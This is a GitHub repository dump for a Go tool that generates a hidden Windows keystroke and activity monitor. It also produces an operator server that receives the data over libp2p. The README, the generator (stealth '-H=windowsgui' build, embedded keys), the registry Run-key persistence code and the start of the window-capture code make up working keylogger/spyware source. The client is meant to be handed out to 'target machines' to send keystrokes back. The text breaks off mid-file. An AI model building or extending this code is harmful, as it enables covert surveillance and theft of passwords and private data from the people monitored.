*GitHub Repository "RIZAmohammadkhan/GuiKeyStandaloneGo"*

'''--- LLM.md ---

'''
'''--- README.md ---
# GuiKeyStandaloneGo - P2P Activity Monitor Suite

GuiKeyStandaloneGo is a project aimed at creating a standalone tool to generate packages for P2P-based activity monitoring. It consists of:

1.  **Generator:** A Go application (intended to be a standalone GUI/CLI executable) that produces deployment packages.
2.  **Activity Monitor Client:** A stealthy Windows client that monitors user activity (foreground application, keyboard input) and sends encrypted data via Libp2p.
3.  **Local Log Server:** A server application that receives encrypted data from clients via Libp2p, stores it, and provides a Web UI for viewing logs.

## Current Project Status (As of [Your Current Date])

The project has achieved a significant milestone: an end-to-end P2P data pipeline.

*   **Generator:**
    *   Functionally complete as a Command Line Interface (CLI).
    *   Generates unique cryptographic keys (AES, Client UUIDs, Server Libp2p Identity).
    *   Embeds all necessary configuration directly into the client and server binaries by generating `config_generated.go` files during its build process for the templates.
    *   Cross-compiles client and server Go templates into Windows executables.
    *   Packages executables with a `README_IMPORTANT_INSTRUCTIONS.txt`.
    *   Successfully handles CGo dependencies for SQLite in the client template.

*   **Client (Windows Executable):**
    *   Starts with embedded configuration.
    *   Monitors foreground application changes and keyboard input (raw key data).
    *   Processes raw key data into human-readable strings.
    *   Aggregates activity into structured `LogEvent` sessions.
    *   Caches these `LogEvent`s locally in an SQLite database (`activity_cache.sqlite`) with retention policies and max size enforcement.
    *   Sets up Windows Registry entry for autostart.
    *   Initializes a Libp2p host with Kademlia DHT, AutoNAT, Relay client, and Hole Punching capabilities.
    *   Actively bootstraps into the DHT and attempts to discover the server.
    *   A `SyncManager` encrypts and sends log batches to the server via a custom P2P protocol. It handles server acknowledgments and updates its local cache.

*   **Server (Windows Executable):**
    *   Starts with embedded configuration.
    *   Initializes a Libp2p host, listens on a configured P2P address.
    *   Participates in the Kademlia DHT (including advertising itself with a rendezvous string) and uses AutoNAT.
    *   Handles incoming P2P streams for the custom log protocol:
        *   Decrypts the received payload.
        *   Unmarshals `LogEvent`s.
        *   Stores events in its own SQLite database (`activity_server.sqlite`).
        *   Sends an acknowledgment response to the client.
    *   Manages its local SQLite log store (pruning old logs).
    *   **A functional (basic) Web UI is implemented** to display logs from its database with pagination, served via an embedded HTTP server.

*   **P2P Communication:**
    *   Client and Server can successfully discover each other (primarily via DHT, potentially mDNS on LAN).
    *   Encrypted data transfer from client to server is working.
    *   Client correctly removes data from its cache upon successful sync acknowledgment from the server.

## Project Structure
```
GuiKeyStandaloneGo/
├── .gitignore
├── go.mod
├── go.sum
├── generator/ # Go application to generate client/server packages
│ ├── main.go
│ └── core/
│ └── generate.go
│ └── templates/ # Go source code templates for client & server
│ ├── client_template/ # Client monitor source
│ │ ├── main.go
│ │ ├── autorun_windows.go
│ │ ├── foreground_windows.go
│ │ ├── keyboard_windows.go
│ │ ├── keyboard_processing.go
│ │ ├── log_store_sqlite.go
│ │ └── p2p_manager.go
│ └── server_template/ # Log receiver server source
│ ├── main.go
│ ├── log_store_sqlite.go
│ ├── p2p_manager.go
│ ├── web_ui_handlers.go
│ ├── static/ # CSS/JS for Web UI
│ │ └── style.css
│ └── web_templates/ # HTML templates for Web UI
│ ├── logs_view.html
│ └── error_page.html
├── pkg/ # Shared Go packages
│ ├── config/
│ │ └── models.go
│ ├── crypto/
│ │ ├── aes.go
│ │ └── keys.go
│ ├── p2p/
│ │ └── protocol.go
│ └── types/
│ └── events.go
└── README.md
```

## Building and Running

### Prerequisites

*   Go (version 1.18+ recommended for generics, though current code might work with slightly older).
*   **For Windows targets (Client & Server):** A C compiler accessible to Go (CGo). MinGW-w64 is recommended if building *on* or *for* Windows.
    *   If building *on* Windows: Install MinGW-w64 (e.g., via MSYS2) and add its `bin` directory to your system PATH.
    *   If cross-compiling *from* Linux/macOS *to* Windows: Install the appropriate MinGW-w64 cross-compiler (e.g., `mingw-w64-x86-64-gcc`).

### Running the Generator

1.  Navigate to the project root (`GuiKeyStandaloneGo/`).
2.  Ensure dependencies are present: `go mod tidy`
3.  Navigate to the generator directory: `cd generator`
4.  Run the generator: `go run main.go -output ../_generated_packages`
    *   The `-output` flag specifies where the `ActivityMonitorClient_Package` and `LocalLogServer_Package` will be created.
    *   Other flags (e.g., for `-bootstrap` addresses) can be added.

### Deploying and Running Client/Server

Follow the instructions in the `README_IMPORTANT_INSTRUCTIONS.txt` file generated within your output package directory. Typically:
1.  Deploy the contents of `LocalLogServer_Package` to your server machine and run `local_log_server.exe`. Note its PeerID and listening addresses from its logs.
2.  Deploy the contents of `ActivityMonitorClient_Package` to the target Windows machine(s) and run `activity_monitor_client.exe`.

## Next Steps & Future Work

*   **Refine Generator Standalone Capability:** Transition the generator from using `go build` (requiring a user Go environment) to embedding pre-compiled client/server payloads and generating only configuration *files* (e.g., JSON) for these payloads. This would make the generator truly standalone.
*   **Generator UI:** Develop a native GUI (e.g., Fyne, Gio, Wails) for the generator for easier use.
*   **Enhanced Logging:** Implement structured, leveled logging (e.g., Zerolog, Zap) in client and server for better diagnostics.
*   **Web UI Enhancements:** Add filtering, searching, and more detailed views to the server's web interface.
*   **Robustness:** Further harden P2P connectivity, error handling, and resource management.
*   **Testing:** Comprehensive unit, integration, and end-to-end tests.
*   **Security:** Review and enhance security considerations (e.g., client authentication beyond shared key).

## Contributions

(Details on how to contribute if this were an open project)

---
'''
'''--- generator/core/generate.go ---
// GuiKeyStandaloneGo/generator/core/generate.go
package core

import (
	"bytes"
	"fmt"
	"html/template"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"guikeystandalonego/pkg/config"
	"guikeystandalonego/pkg/crypto"

	"github.com/libp2p/go-libp2p/core/peer"
)

type GeneratorSettings struct {
	OutputDirPath         string
	BootstrapAddresses    string
	ClientConfigOverrides config.ClientSettings
	ServerConfigOverrides config.ServerSettings
}

type GeneratedInfo struct {
	AppClientID           string
	AppEncryptionKeyHex   string
	ServerPeerID          string
	ServerIdentitySeedHex string
}

const readmeTemplate = `Activity Monitoring Suite - Generated Packages (P2P Mode)
========================================================

This package was generated by the GuiKeyStandaloneGo Generator on {{.Timestamp}}.

Generated App-Level Client ID (for logs): {{.Generated.AppClientID}}
Generated App-Level Encryption Key (Hex): {{.Generated.AppEncryptionKeyHex}}
Generated Server Libp2p Peer ID: {{.Generated.ServerPeerID}}
Generated Server Libp2p Identity Seed (Hex): {{.Generated.ServerIdentitySeedHex}}

Instructions:
------------

1. Local Log Server (For Your Machine - The Operator):
   - The 'LocalLogServer_Package' directory contains the server application and its configuration.
   - It also contains 'web_templates' and 'static' subdirectories for the UI.
   - Run '{{.ServerExeName}}' from within this directory.
   - Server P2P Listen Address (configured): {{.ServerConfig.ListenAddress}}
   - Server Web UI Listen Address: {{.ServerConfig.WebUIListenAddress}}
   - Access Web UI at: http://{{.WebUIAccessAddress}}/logs
   - Server Bootstrap Addresses: {{range .ServerConfig.BootstrapAddresses}}{{.}} {{end}}
   - Server Log File: {{.ServerConfig.InternalLogFileDir}}/{{.ServerConfig.InternalLogFileName}} (Level: {{.ServerConfig.InternalLogLevel}})

2. Activity Monitor Client (For Distribution to Target Machines):
   - The 'ActivityMonitorClient_Package' directory contains the client application.
   - Distribute the *contents* of this directory to the machine(s) you want to monitor.
   - Run '{{.ClientExeName}}' on the target machine(s).
   - It is configured to connect to Server Peer ID: {{.Generated.ServerPeerID}}
   - It will use these bootstrap multiaddresses: {{range .ClientConfig.BootstrapAddresses}}{{.}} {{end}}
   - Client Log File: {{.ClientConfig.InternalLogFileDir}}/{{.ClientConfig.InternalLogFileName}} (Level: {{.ClientConfig.InternalLogLevel}})

Security Considerations:
- The app-level encryption key is vital for data confidentiality. Keep it secure.
- The server's libp2p identity seed is critical.
- Secure the machine running the Local Log Server.
- Ensure proper consent and adhere to privacy laws when deploying the client monitor.
`

const clientGeneratedConfigTemplate = `// Code generated by GuiKeyStandaloneGo generator. DO NOT EDIT.
package main 

const (
	CfgServerPeerID                       = "{{.ServerPeerID}}"
	CfgEncryptionKeyHex                   = "{{.EncryptionKeyHex}}"
	CfgClientID                           = "{{.ClientID}}"
	CfgSyncIntervalSecs                   = {{.SyncIntervalSecs}}
	CfgProcessorPeriodicFlushIntervalSecs = {{.ProcessorPeriodicFlushIntervalSecs}}
	CfgInternalLogLevel                   = "{{.InternalLogLevel}}"
	CfgLogFilePath                        = ` + "`{{.LogFilePath}}`" + ` 
	CfgAppNameForAutorun                  = "{{.AppNameForAutorun}}"
	CfgLocalLogCacheRetentionDays         = {{.LocalLogCacheRetentionDays}}
	CfgRetryIntervalOnFailSecs            = {{.RetryIntervalOnFailSecs}}
	CfgMaxRetriesPerBatch                 = {{.MaxRetriesPerBatch}}
	CfgMaxEventsPerSyncBatch              = {{.MaxEventsPerSyncBatch}}
	CfgInternalLogFileDir                 = ` + "`{{.InternalLogFileDir}}`" + `
	CfgInternalLogFileName                = "{{.InternalLogFileName}}"
)

var CfgBootstrapAddresses = []string{
{{range .BootstrapAddresses}}	` + "`{{.}}`," + `
{{end}}}

{{if .MaxLogFileSizeMBIsSet}}
var CfgMaxLogFileSizeMBValue = uint64({{.MaxLogFileSizeMBValue}})
var CfgMaxLogFileSizeMB = &CfgMaxLogFileSizeMBValue
{{else}}
var CfgMaxLogFileSizeMB *uint64 = nil
{{end}}
`

const serverGeneratedConfigTemplate = `// Code generated by GuiKeyStandaloneGo generator. DO NOT EDIT.
package main

const (
	CfgP2PListenAddress            = "{{.ListenAddress}}"
	CfgWebUIListenAddress          = "{{.WebUIListenAddress}}"
	CfgEncryptionKeyHex            = "{{.EncryptionKeyHex}}"
	CfgServerIdentityKeySeedHex    = "{{.ServerIdentityKeySeedHex}}"
	CfgDatabasePath                = ` + "`{{.DatabasePath}}`" + `
	CfgLogRetentionDays            = {{.LogRetentionDays}}
	CfgLogDeletionCheckIntervalHrs = {{.LogDeletionCheckIntervalHrs}}
	CfgInternalLogLevel            = "{{.InternalLogLevel}}"      
	CfgInternalLogFileDir          = ` + "`{{.InternalLogFileDir}}`" + `   
	CfgInternalLogFileName         = "{{.InternalLogFileName}}"      
)

var CfgBootstrapAddresses = []string{
{{range .BootstrapAddresses}}	` + "`{{.}}`," + `
{{end}}}
`

func PerformGeneration(genSettings *GeneratorSettings) (GeneratedInfo, error) {
	var genInfo GeneratedInfo
	log.Println("Starting generation process (with embedded configs)...")

	if genSettings.OutputDirPath == "" {
		return genInfo, fmt.Errorf("output directory is not set")
	}
	if err := os.MkdirAll(genSettings.OutputDirPath, 0755); err != nil {
		return genInfo, fmt.Errorf("failed to create output directory: %w", err)
	}

	genInfo.AppClientID = crypto.GenerateAppClientID()
	aesKeyBytes, err := crypto.GenerateAESKeyBytes()
	if err != nil {
		return genInfo, fmt.Errorf("failed to generate AES key: %w", err)
	}
	genInfo.AppEncryptionKeyHex = fmt.Sprintf("%x", aesKeyBytes)

	serverIdentitySeedHex, err := crypto.GenerateLibp2pIdentitySeedHex()
	if err != nil {
		return genInfo, fmt.Errorf("failed to generate server identity seed: %w", err)
	}
	genInfo.ServerIdentitySeedHex = serverIdentitySeedHex

	serverPrivKey, _, err := crypto.Libp2pKeyFromSeedHex(serverIdentitySeedHex)
	if err != nil {
		return genInfo, fmt.Errorf("failed to derive server libp2p key: %w", err)
	}
	serverPID, err := peer.IDFromPrivateKey(serverPrivKey)
	if err != nil {
		return genInfo, fmt.Errorf("failed to get server peer ID: %w", err)
	}
	genInfo.ServerPeerID = serverPID.String()

	log.Printf("Generated App Client ID: %s", genInfo.AppClientID)
	log.Printf("Generated Server Peer ID: %s", genInfo.ServerPeerID)

	// --- Prepare Client Configuration Values ---
	clientCfgValues := config.DefaultClientSettings()
	// Apply overrides from genSettings.ClientConfigOverrides to clientCfgValues
	// This is where UI/CLI flags for specific client settings would be applied.
	// Example:
	// if genSettings.ClientConfigOverrides.SyncIntervalSecs > 0 {
	//     clientCfgValues.SyncIntervalSecs = genSettings.ClientConfigOverrides.SyncIntervalSecs
	// } // ... and so on for other overridable fields.
	clientCfgValues.ClientID = genInfo.AppClientID
	clientCfgValues.EncryptionKeyHex = genInfo.AppEncryptionKeyHex
	clientCfgValues.ServerPeerID = genInfo.ServerPeerID
	if genSettings.BootstrapAddresses != "" {
		addrs := strings.Split(genSettings.BootstrapAddresses, ",")
		clientCfgValues.BootstrapAddresses = make([]string, 0, len(addrs))
		for _, addr := range addrs {
			trimmedAddr := strings.TrimSpace(addr)
			if trimmedAddr != "" {
				clientCfgValues.BootstrapAddresses = append(clientCfgValues.BootstrapAddresses, trimmedAddr)
			}
		}
	}

	// --- Prepare Server Configuration Values ---
	serverCfgValues := config.DefaultServerSettings() // This now includes defaults for log paths and bootstrap
	// Apply overrides from genSettings.ServerConfigOverrides to serverCfgValues
	// Example:
	// if genSettings.ServerConfigOverrides.LogRetentionDays != 0 {
	//     serverCfgValues.LogRetentionDays = genSettings.ServerConfigOverrides.LogRetentionDays
	// }
	// if genSettings.ServerConfigOverrides.InternalLogLevel != "" {
	//     serverCfgValues.InternalLogLevel = genSettings.ServerConfigOverrides.InternalLogLevel
	// } // ... and so on for other overridable fields.
	serverCfgValues.EncryptionKeyHex = genInfo.AppEncryptionKeyHex
	serverCfgValues.ServerIdentityKeySeedHex = genInfo.ServerIdentitySeedHex
	// Server uses the same bootstrap list as the client for simplicity in this setup
	if len(clientCfgValues.BootstrapAddresses) > 0 {
		serverCfgValues.BootstrapAddresses = make([]string, len(clientCfgValues.BootstrapAddresses))
		copy(serverCfgValues.BootstrapAddresses, clientCfgValues.BootstrapAddresses)
	} else {
		// If client also has no bootstrap (e.g., user cleared it via -bootstrap=""),
		// then server also gets an empty list from this logic.
		// DefaultServerSettings already initializes BootstrapAddresses to an empty slice,
		// so this ensures it's explicitly an empty slice if client's is also empty.
		serverCfgValues.BootstrapAddresses = []string{}
	}
	// The fields InternalLogLevel, InternalLogFileDir, InternalLogFileName for serverCfgValues
	// will take their values from config.DefaultServerSettings() unless explicitly overridden
	// by genSettings.ServerConfigOverrides. Since we added them to DefaultServerSettings, they are populated.

	_, currentFilePath, _, ok := runtime.Caller(0)
	if !ok {
		return genInfo, fmt.Errorf("could not get current file path for template resolution")
	}
	corePackageDir := filepath.Dir(currentFilePath)
	generatorPackageDir := filepath.Dir(corePackageDir)
	templatesBaseDir := filepath.Join(generatorPackageDir, "templates")

	clientSrcPath := filepath.Join(templatesBaseDir, "client_template")
	serverSrcPath := filepath.Join(templatesBaseDir, "server_template")

	clientExeName := "activity_monitor_client.exe"
	serverExeName := "local_log_server.exe"

	clientPackagePath := filepath.Join(genSettings.OutputDirPath, "ActivityMonitorClient_Package")
	serverPackagePath := filepath.Join(genSettings.OutputDirPath, "LocalLogServer_Package")

	if err := os.MkdirAll(clientPackagePath, 0755); err != nil {
		return genInfo, fmt.Errorf("failed to create client package dir: %w", err)
	}
	if err := os.MkdirAll(serverPackagePath, 0755); err != nil {
		return genInfo, fmt.Errorf("failed to create server package dir: %w", err)
	}

	// 3. Generate config_generated.go files
	clientTemplateData := struct {
		config.ClientSettings
		MaxLogFileSizeMBIsSet bool
		MaxLogFileSizeMBValue uint64
	}{ClientSettings: clientCfgValues}
	if clientCfgValues.MaxLogFileSizeMB != nil {
		clientTemplateData.MaxLogFileSizeMBIsSet = true
		clientTemplateData.MaxLogFileSizeMBValue = *clientCfgValues.MaxLogFileSizeMB
	}

	clientGeneratedGoPath := filepath.Join(clientSrcPath, "config_generated.go")
	if err := writeGoConfig(clientGeneratedGoPath, clientGeneratedConfigTemplate, clientTemplateData); err != nil {
		return genInfo, fmt.Errorf("failed to write client_generated_config.go: %w", err)
	}

	// Pass serverCfgValues directly as its template now expects all necessary fields
	serverGeneratedGoPath := filepath.Join(serverSrcPath, "config_generated.go")
	if err := writeGoConfig(serverGeneratedGoPath, serverGeneratedConfigTemplate, serverCfgValues); err != nil {
		return genInfo, fmt.Errorf("failed to write server_generated_config.go: %w", err)
	}

	// 4. Compile Client and Server Templates
	clientOutPath := filepath.Join(clientPackagePath, clientExeName)
	serverOutPath := filepath.Join(serverPackagePath, serverExeName)

	log.Println("Compiling client template...")
	if err := compileGoTemplate(clientSrcPath, clientOutPath, true); err != nil {
		return genInfo, fmt.Errorf("failed to compile client template: %w", err)
	}
	log.Println("Compiling server template...")
	if err := compileGoTemplate(serverSrcPath, serverOutPath, false); err != nil {
		return genInfo, fmt.Errorf("failed to compile server template: %w", err)
	}

	defer os.Remove(clientGeneratedGoPath)
	defer os.Remove(serverGeneratedGoPath)

	// 5. Copy Server UI Assets
	serverPackageStaticDir := filepath.Join(serverPackagePath, "static")
	serverPackageTemplatesDir := filepath.Join(serverPackagePath, "web_templates")

	sourceStaticDir := filepath.Join(serverSrcPath, "static")
	sourceWebTemplatesDir := filepath.Join(serverSrcPath, "web_templates")

	if err := copyDir(sourceStaticDir, serverPackageStaticDir); err != nil {
		log.Printf("Warning: Failed to copy server static assets from %s: %v", sourceStaticDir, err)
	} else {
		log.Printf("Copied server static assets to %s", serverPackageStaticDir)
	}
	if err := copyDir(sourceWebTemplatesDir, serverPackageTemplatesDir); err != nil {
		log.Printf("Warning: Failed to copy server HTML templates from %s: %v", sourceWebTemplatesDir, err)
	} else {
		log.Printf("Copied server HTML templates to %s", serverPackageTemplatesDir)
	}

	// 6. Create README
	readmeData := struct {
		Timestamp          string
		Generated          GeneratedInfo
		ClientConfig       config.ClientSettings
		ServerConfig       config.ServerSettings
		ClientExeName      string
		ServerExeName      string
		WebUIAccessAddress string
	}{
		Timestamp:          time.Now().Format(time.RFC1123),
		Generated:          genInfo,
		ClientConfig:       clientCfgValues,
		ServerConfig:       serverCfgValues,
		ClientExeName:      clientExeName,
		ServerExeName:      serverExeName,
		WebUIAccessAddress: strings.Replace(serverCfgValues.WebUIListenAddress, "0.0.0.0", "127.0.0.1", 1),
	}
	tmplReadme, err := template.New("readme").Parse(readmeTemplate)
	if err != nil {
		return genInfo, fmt.Errorf("failed to parse README template: %w", err)
	}
	readmeFile, err := os.Create(filepath.Join(genSettings.OutputDirPath, "README_IMPORTANT_INSTRUCTIONS.txt"))
	if err != nil {
		return genInfo, fmt.Errorf("failed to create README file: %w", err)
	}
	defer readmeFile.Close()
	if err := tmplReadme.Execute(readmeFile, readmeData); err != nil {
		return genInfo, fmt.Errorf("failed to execute README template: %w", err)
	}

	log.Println("Generation process completed successfully!")
	log.Printf("Packages generated in: %s", genSettings.OutputDirPath)
	return genInfo, nil
}

// writeGoConfig, compileGoTemplate, buildEnvValueFor, copyDir functions remain the same as previous full generate.go

func writeGoConfig(path string, goTemplateContent string, cfgData interface{}) error {
	tmpl, err := template.New("goconfig").Parse(goTemplateContent)
	if err != nil {
		return fmt.Errorf("failed to parse Go config template for path %s: %w", path, err)
	}
	parentDir := filepath.Dir(path)
	if err := os.MkdirAll(parentDir, 0755); err != nil {
		return fmt.Errorf("failed to create parent directory %s for generated Go config: %w", parentDir, err)
	}
	file, err := os.Create(path)
	if err != nil {
		return fmt.Errorf("failed to create generated Go config file %s: %w", path, err)
	}
	defer file.Close()
	if err := tmpl.Execute(file, cfgData); err != nil {
		return fmt.Errorf("failed to execute Go config template for %s: %w", path, err)
	}
	return nil
}

func compileGoTemplate(srcDir, outputPath string, clientStealth bool) error {
	cmd := exec.Command("go", "build", "-o", outputPath)
	cmd.Dir = srcDir
	buildEnv := append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=1")
	targetGOOS := buildEnvValueFor("GOOS", buildEnv)
	generatorGOOS := runtime.GOOS
	if targetGOOS == "windows" && generatorGOOS != "windows" {
		buildEnv = append(buildEnv, "CC=x86_64-w64-mingw32-gcc")
	}
	cmd.Env = buildEnv
	var ldflags []string
	if clientStealth {
		ldflags = append(ldflags, "-H=windowsgui")
	}
	if len(ldflags) > 0 {
		cmd.Args = append(cmd.Args, "-ldflags="+strings.Join(ldflags, " "))
	}
	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	log.Printf("Running build command: %s %s (Target Env: GOOS=%s GOARCH=%s CGO_ENABLED=%s CC=%s)",
		cmd.Path, strings.Join(cmd.Args[1:], " "),
		buildEnvValueFor("GOOS", cmd.Env), buildEnvValueFor("GOARCH", cmd.Env),
		buildEnvValueFor("CGO_ENABLED", cmd.Env), buildEnvValueFor("CC", cmd.Env))
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to compile %s: %w\nBuild command: %s %s\nEnv: %v\nStdout: %s\nStderr: %s",
			srcDir, err, cmd.Path, strings.Join(cmd.Args[1:], " "), cmd.Env, stdout.String(), stderr.String())
	}
	return nil
}

func buildEnvValueFor(key string, env []string) string {
	prefix := key + "="
	for _, entry := range env {
		if strings.HasPrefix(entry, prefix) {
			return entry[len(prefix):]
		}
	}
	return ""
}

func copyDir(src string, dst string) error {
	srcInfo, err := os.Stat(src)
	if err != nil {
		if os.IsNotExist(err) {
			log.Printf("Info: Source directory %s does not exist, skipping copy.", src)
			return nil
		}
		return err
	}
	if !srcInfo.IsDir() {
		return fmt.Errorf("source %s is not a directory", src)
	}
	if err := os.MkdirAll(dst, srcInfo.Mode()); err != nil {
		return err
	}
	entries, err := os.ReadDir(src)
	if err != nil {
		return err
	}
	for _, entry := range entries {
		srcPath := filepath.Join(src, entry.Name())
		dstPath := filepath.Join(dst, entry.Name())
		if entry.IsDir() {
			if err := copyDir(srcPath, dstPath); err != nil {
				return err
			}
		} else {
			srcFile, errF := os.Open(srcPath)
			if errF != nil {
				return errF
			}
			dstFile, errC := os.Create(dstPath)
			if errC != nil {
				srcFile.Close()
				return errC
			}
			if _, errCP := io.Copy(dstFile, srcFile); errCP != nil {
				srcFile.Close()
				dstFile.Close()
				return errCP
			}
			srcFile.Close()
			dstFile.Close()
			fileInfo, errI := entry.Info()
			if errI == nil {
				if errC := os.Chmod(dstPath, fileInfo.Mode()); errC != nil {
					log.Printf("Warning: could not chmod %s: %v", dstPath, errC)
				}
			} else {
				log.Printf("Warning: could not get FileInfo for %s to copy mode: %v", srcPath, errI)
			}
		}
	}
	return nil
}

'''
'''--- generator/main.go ---
// GuiKeyStandaloneGo/generator/main.go
package main

import (
	"flag"
	"log"
	"path/filepath"
	"strings" // Import strings

	"guikeystandalonego/generator/core" // Corrected import
	"guikeystandalonego/pkg/config"     // Corrected import
)

func main() {
	outputDir := flag.String("output", "./_generated_packages", "Directory to save generated packages") // Changed default to avoid conflict with previous example
	bootstrapAddrs := flag.String("bootstrap", strings.Join(config.DefaultClientSettings().BootstrapAddresses, ","), "Comma-separated libp2p bootstrap multiaddresses")
	// Add more flags for client/server config overrides later

	flag.Parse()

	// It's good practice to use absolute paths for clarity
	absOutputDir, err := filepath.Abs(*outputDir)
	if err != nil {
		log.Fatalf("Failed to get absolute path for output directory: %v", err)
	}

	// Create a default GeneratorSettings instance.
	// In a real GUI/more complex CLI, you'd populate these from user input.
	settings := core.GeneratorSettings{
		OutputDirPath:      absOutputDir,
		BootstrapAddresses: *bootstrapAddrs,
		// ClientConfigOverrides and ServerConfigOverrides would be populated here
		// if you had flags for individual settings.
		// For now, they'll use defaults or what's hardcoded in PerformGeneration.
	}

	if _, err := core.PerformGeneration(&settings); err != nil {
		log.Fatalf("Generation failed: %v", err)
	}
}

'''
'''--- generator/templates/client_template/autorun_windows.go ---
// GuiKeyStandaloneGo/generator/templates/client_template/autorun_windows.go
package main

import (
	"fmt"
	"log"           // For os.Executable()
	"path/filepath" // For filepath.Clean
	"strings"

	"golang.org/x/sys/windows/registry"
)

const (
	// Registry path for user-specific autostart programs
	// HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
	runKeyPath = `Software\Microsoft\Windows\CurrentVersion\Run`
)

// setupAutostart configures the application to run on Windows startup for the current user.
// appName: The name for the registry entry (e.g., "SystemActivityAgent").
// appPath: The full path to the executable.
func setupAutostart(appName string, appPath string, logger *log.Logger) error {
	if appName == "" {
		return fmt.Errorf("autorun: app name cannot be empty")
	}
	if appPath == "" {
		return fmt.Errorf("autorun: app path cannot be empty")
	}

	// Ensure appPath is clean and absolute for reliability
	absAppPath, err := filepath.Abs(appPath)
	if err != nil {
		return fmt.Errorf("autorun: failed to get absolute path for '%s': %w", appPath, err)
	}
	// On Windows, registry values are often stored with double backslashes or quoted if they contain spaces.
	// However, registry.SetStringValue usually handles this correctly. For paths with spaces,
	// it's common practice to enclose them in quotes for the Run key value.
	// Let's ensure it's quoted if it contains spaces.
	// Go's registry package should handle this, but being explicit can be safer for `cmd.exe` execution.
	// For now, we'll pass the direct path; if issues arise with spaces, we can add quotes.
	// A simple way to quote: pathWithQuotes := `"` + absAppPath + `"`

	logger.Printf("Autorun: Attempting to set up autostart for '%s' with path '%s'", appName, absAppPath)

	// Open the HKEY_CURRENT_USER root key.
	// This does not require administrator privileges.
	key, err := registry.OpenKey(registry.CURRENT_USER, runKeyPath, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		// If the key doesn't exist, OpenKey might fail. Try CreateKey.
		// However, the "Run" key almost always exists. If OpenKey fails with SET_VALUE,
		// it's more likely a permission issue, though HKCU\Software\Microsoft\Windows\CurrentVersion\Run
		// should be writable by the current user.
		// Let's try to create it if it doesn't exist, though this is rare for the Run key.
		key, _, err = registry.CreateKey(registry.CURRENT_USER, runKeyPath, registry.SET_VALUE|registry.QUERY_VALUE)
		if err != nil {
			return fmt.Errorf("autorun: failed to open or create registry key HKCU\\%s: %w", runKeyPath, err)
		}
		logger.Printf("Autorun: Created registry key HKCU\\%s as it did not exist.", runKeyPath)
	}
	defer key.Close()

	// Check if the value already exists and is correct
	existingPath, _, err := key.GetStringValue(appName)
	if err == nil { // Value exists
		// Normalize paths for comparison (e.g. case-insensitivity on Windows, clean slashes)
		if strings.EqualFold(filepath.Clean(existingPath), filepath.Clean(absAppPath)) {
			logger.Printf("Autorun: Entry '%s' already correctly set to '%s'. No changes made.", appName, absAppPath)
			return nil
		}
		logger.Printf("Autorun: Entry '%s' exists but points to '%s'. Updating to '%s'.", appName, existingPath, absAppPath)
	} else if err != registry.ErrNotExist { // Some other error reading the value
		return fmt.Errorf("autorun: failed to read existing registry value for '%s': %w", appName, err)
	}
	// If err is registry.ErrNotExist, or if it exists but is wrong, we set/update it.

	// Set the string value: Name = appName, Value = path to executable
	err = key.SetStringValue(appName, absAppPath)
	if err != nil {
		return fmt.Errorf("autorun: failed to set registry value for '%s' to '%s': %w", appName, absAppPath, err)
	}

	logger.Printf("Autorun: Successfully set autostart entry for '%s' to '%s'", appName, absAppPath)
	return nil
}

// removeAutostart removes the application's autostart registry entry.
// Useful for uninstallation or disabling autostart.
func removeAutostart(appName string, logger *log.Logger) error {
	if appName == "" {
		return fmt.Errorf("autorun: app name cannot be empty for removal")
	}

	logger.Printf("Autorun: Attempting to remove autostart entry for '%s'", appName)

	key, err := registry.OpenKey(registry.CURRENT_USER, runKeyPath, registry.SET_VALUE) // Need write access to delete
	if err != nil {
		if err == registry.ErrNotExist {
			logger.Printf("Autorun: Registry key HKCU\\%s does not exist. Nothing to remove for '%s'.", runKeyPath, appName)
			return nil // Not an error if key itself is gone
		}
		return fmt.Errorf("autorun: failed to open registry key HKCU\\%s for delete: %w", runKeyPath, err)
	}
	defer key.Close()

	err = key.DeleteValue(appName)
	if err != nil {
		if err == registry.ErrNotExist {
			logger.Printf("Autorun: Autostart entry '%s' not found. Nothing to remove.", appName)
			return nil // Not an error if the value is already gone
		}
		return fmt.Errorf("autorun: failed to delete registry value '%s': %w", appName, err)
	}

	logger.Printf("Autorun: Successfully removed autostart entry for '%s'", appName)
	return nil
}

'''
'''--- generator/templates/client_template/foreground_windows.go ---
// GuiKeyStandaloneGo/generator/templates/client_template/foreground_windows.go
package main

import (
	"fmt"
	"log"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ****** ADDED MISSING CONSTANTS ******
const (
	PROCESS_QUERY_INFORMATION         = 0x0400
	PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
	MAX_PATH                          = 260 // Standard Windows MAX_PATH
)

// ****** END ADDED MISSING CONSTANTS ******

// Re-declare LazyDLLs and procs for this file if not sharing globally
// This makes the file more self-contained for its specific functions.
// Ensure names don't clash if they are intended to be different instances.
var (
	lazyModUser32FgProc            = windows.NewLazySystemDLL("user32.dll")
	lazyModKernel32FgProc          = windows.NewLazySystemDLL("kernel32.dll") // Use a distinct name
	procGetForegroundWindowFg      = lazyModUser32FgProc.NewProc("GetForegroundWindow")
	procGetWindowTextWFg           = lazyModUser32FgProc.NewProc("GetWindowTextW")
	procGetWindowThreadProcessIdFg = lazyModUser32FgProc.NewProc("GetWindowThreadProcessId")
	// procOpenProcess is part of golang.org/x/sys/windows as windows.OpenProcess
	// procQueryFullProcessImageName is part of golang.org/x/sys/windows as windows.QueryFullProcessImageName
	// procCloseHandle is part of golang.org/x/sys/windows as windows.CloseHandle
)

type ForegroundAppInfo struct {
	HWND           uintptr
	PID            uint32
	ThreadID       uint32
	Title          string
	ProcessName    string
	ExecutablePath string
}

func GetForegroundWindowInternal() (hwnd uintptr, err error) {
	r0, _, e1 := syscall.SyscallN(procGetForegroundWindowFg.Addr())
	// Check for actual error, not just "operation completed successfully"
	if r0 == 0 && e1 != 0 && e1.Error() != "The operation completed successfully." {
		return 0, e1
	}
	if r0 == 0 && (e1 == 0 || (e1 != 0 && e1.Error() == "The operation completed successfully.")) {
		// No window is in the foreground, or an error occurred but GetLastError is 0.
		// This is not necessarily an error for this function's purpose.
		return 0, nil
	}
	return r0, nil
}

func GetWindowTextInternal(hwnd uintptr) (string, error) {
	var buffer [512]uint16
